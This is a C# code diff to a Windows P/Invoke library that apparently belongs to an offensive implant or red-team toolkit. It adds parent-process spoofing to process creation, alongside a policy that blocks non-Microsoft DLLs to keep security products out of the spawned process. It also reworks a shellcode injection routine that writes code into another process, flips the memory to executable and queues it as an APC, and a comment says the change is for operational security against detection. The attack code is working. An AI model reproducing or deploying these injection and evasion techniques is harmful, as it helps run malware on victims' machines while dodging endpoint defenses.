@@ -29,25 +29,49 @@ namespace WinAPI.PInvoke
             var outPipe_w = IntPtr.Zero;
             PROCESS_CREATION_FLAGS creationFlags = 0;
             var result = new ProcessCreationResult();
+            IntPtr hParentProcess = IntPtr.Zero;
+            IntPtr parentAttributeValue = IntPtr.Zero;
+            IntPtr blockDllAttributeValue = IntPtr.Zero;
             try
             {
+                int attributeCount = 1; // Block DLL policy
+                if (parms.ParentProcessId != 0)
+                    attributeCount++;
+
                 IntPtr lpSize = IntPtr.Zero;
-                Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+                Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, attributeCount, 0, ref lpSize);
                 startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-                Kernel32.InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, 1, 0, ref lpSize);
+                Kernel32.InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, attributeCount, 0, ref lpSize);
 
                 const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                 const int MITIGATION_POLICY = 0x20007;
 
-                var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
-                Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
+                blockDllAttributeValue = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(blockDllAttributeValue, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
 
                 _ = Kernel32.UpdateProcThreadAttribute(
                     startupInfoEx.lpAttributeList,
                     (uint)0,
                     (IntPtr)MITIGATION_POLICY,
-                    blockDllPtr,
+                    blockDllAttributeValue,
                     (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+
+                if (parms.ParentProcessId != 0)
+                {
+                    hParentProcess = Kernel32.OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, parms.ParentProcessId);
+                    if (hParentProcess != IntPtr.Zero)
+                    {
+                        parentAttributeValue = Marshal.AllocHGlobal(IntPtr.Size);
+                        Marshal.WriteIntPtr(parentAttributeValue, hParentProcess);
+
+                        _ = Kernel32.UpdateProcThreadAttribute(
+                            startupInfoEx.lpAttributeList,
+                            (uint)0,
+                            (IntPtr)0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+                            parentAttributeValue,
+                            (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+                    }
+                }
 
                 if (parms.RedirectOutput)
                 {
@@ -115,9 +139,14 @@ namespace WinAPI.PInvoke
                     Kernel32.DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
                     Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                 }
-                //Marshal.FreeHGlobal(lpValue);
+                if (blockDllAttributeValue != IntPtr.Zero)
+                    Marshal.FreeHGlobal(blockDllAttributeValue);
+                if (parentAttributeValue != IntPtr.Zero)
+                    Marshal.FreeHGlobal(parentAttributeValue);
 
                 Kernel32.CloseHandle(outPipe_w);
+                if (hParentProcess != IntPtr.Zero)
+                    Kernel32.CloseHandle(hParentProcess);
             }
             return result;
         }
@@ -217,65 +246,40 @@ namespace WinAPI.PInvoke
 
         public static void InjectProcessHollowingWithAPC(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, int entrypointOffset = 0)
         {
-            const uint GENERIC_ALL = 0x10000000;
-            const uint PAGE_EXECUTE_READWRITE = 0x40;
-            const uint SEC_COMMIT = 0x08000000;
-
-            var hLocalSection = IntPtr.Zero;
-            var maxSize = (uint)shellcode.Length;
-
-            var status = Native.NtCreateSection(
-                ref hLocalSection,
-                GENERIC_ALL,
-                IntPtr.Zero,
-                ref maxSize,
-                PAGE_EXECUTE_READWRITE,
-                SEC_COMMIT,
-                IntPtr.Zero);
-
-            const uint PAGE_READWRITE = 0x04;
-
-            var self = System.Diagnostics.Process.GetCurrentProcess();
-            var hLocalBaseAddress = IntPtr.Zero;
-
-            ulong sectionOffset;
-
-            status = Native.NtMapViewOfSection(
-                hLocalSection,
-                self.Handle,
-                ref hLocalBaseAddress,
-                UIntPtr.Zero,
-                UIntPtr.Zero,
-                out sectionOffset,
-                out maxSize,
-                2,
-                0,
-                PAGE_READWRITE);
-
-            const uint PAGE_EXECUTE_READ = 0x20;
-
-            var hRemoteBaseAddress = IntPtr.Zero;
-
-            status = Native.NtMapViewOfSection(
-                hLocalSection,
+            // OPSEC: allocate RW, write shellcode, then flip to RX (avoid RWX allocation)
+            var baseAddress = Kernel32.VirtualAllocEx(
                 processHandle,
-                ref hRemoteBaseAddress,
-                UIntPtr.Zero,
-                UIntPtr.Zero,
-                out sectionOffset,
-                out maxSize,
-                2,
-                0,
-                PAGE_EXECUTE_READ);
+                IntPtr.Zero,
+                shellcode.Length,
+                AllocationType.Commit | AllocationType.Reserve,
+                MemoryProtection.ReadWrite);
 
-            Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);
+            if (baseAddress == IntPtr.Zero)
+                throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");
 
-            var res = Native.NtQueueApcThread(
-            threadHandle,
-            hRemoteBaseAddress + entrypointOffset,
-            IntPtr.Zero,
-            IntPtr.Zero,
-            IntPtr.Zero);
+            IntPtr bytesWritten = IntPtr.Zero;
+            if (!Kernel32.WriteProcessMemory(processHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
+                throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");
+
+            if (bytesWritten.ToInt32() != shellcode.Length)
+                throw new InvalidOperationException($"Failed to write All the shellcode into the process");
+
+            if (!Kernel32.VirtualProtectEx(
+                processHandle,
+                baseAddress,
+                shellcode.Length,
+                MemoryProtection.ExecuteRead,
+                out _))
+            {
+                throw new InvalidOperationException($"Failed to change memory to execute, error code: {Marshal.GetLastWin32Error()}");
+            }
+
+            _ = Native.NtQueueApcThread(
+                threadHandle,
+                baseAddress + entrypointOffset,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero);
 
             UInt32 prev = 0;
             _ = Native.NtResumeThread(threadHandle, ref prev);
